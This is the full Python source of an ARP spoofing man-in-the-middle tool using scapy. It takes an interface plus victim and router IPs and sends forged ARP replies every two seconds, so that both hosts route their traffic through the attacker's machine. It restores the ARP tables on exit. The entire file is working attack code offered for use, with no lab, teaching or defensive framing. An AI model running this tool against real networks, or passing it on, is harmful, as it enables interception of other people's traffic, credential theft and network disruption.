import scapy.all as scapy
import argparse
import time
from termcolor import colored

# Print MITM Active Status
print(colored("🟢 [ M I T M  A C T I V E ] 🟢", "green", attrs=["bold", "blink", "reverse"]))

# Function to Get Command-line Arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Interface used for the attack.")
    parser.add_argument("-t", "--targets", nargs=2, required=True, dest="targets", help="IP Address of victim and router.")
    return parser.parse_args()

# Function to Get MAC Address of an IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
    arp_request_broadcast = broadcast / arp_request  
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# Function to Spoof ARP Table (MITM Attack)
def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not get MAC address for {target_ip}. Skipping...")
        return

    # Get Attacker's Own MAC Address
    my_mac = scapy.get_if_hwaddr(interface)

    # Create ARP Spoof Packet (Fix: Explicitly Set Ethernet Destination MAC)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,                  # is-at ARP (Reply)
        pdst=target_ip,        # Target IP
        hwdst=target_mac,      # Target MAC (Fix Warning)
        psrc=spoof_ip,         # Fake IP Address (Gateway/Victim)
        hwsrc=my_mac           # Attacker's MAC
    )

    scapy.sendp(packet, verbose=False)  # Use `sendp()` for Ethernet Layer Packets
    print(f"[+] Spoofed ARP Reply Sent: {spoof_ip} is-at {my_mac} -> {target_ip}")


# Function to Restore Original ARP Tables
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac is None or source_mac is None:
        print(f"[!] Could not restore ARP table for {destination_ip} <-> {source_ip}.")
        return

    # Send Correct ARP Packets to Restore Network
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    print(f"[+] Restored ARP Table: {source_ip} is-at {source_mac} -> {destination_ip}")

# Parse User Input Arguments
options = get_arguments()

packets_sent = 0
try:
    while True:
        spoof(options.targets[0], options.targets[1], options.interface)  # Spoof Victim
        spoof(options.targets[1], options.targets[0], options.interface)  # Spoof Router
        packets_sent += 2
        print(f"\r[+] Packets sent: {packets_sent}", end="")
        time.sleep(2)  # Wait before sending next packets
except KeyboardInterrupt:
    print("\n\n[+] CTRL+C Detected. Restoring ARP tables...")
    restore(options.targets[0], options.targets[1])  # Restore Victim
    restore(options.targets[1], options.targets[0])  # Restore Router
    print("\n[+] ARP Tables Restored. Exiting...")
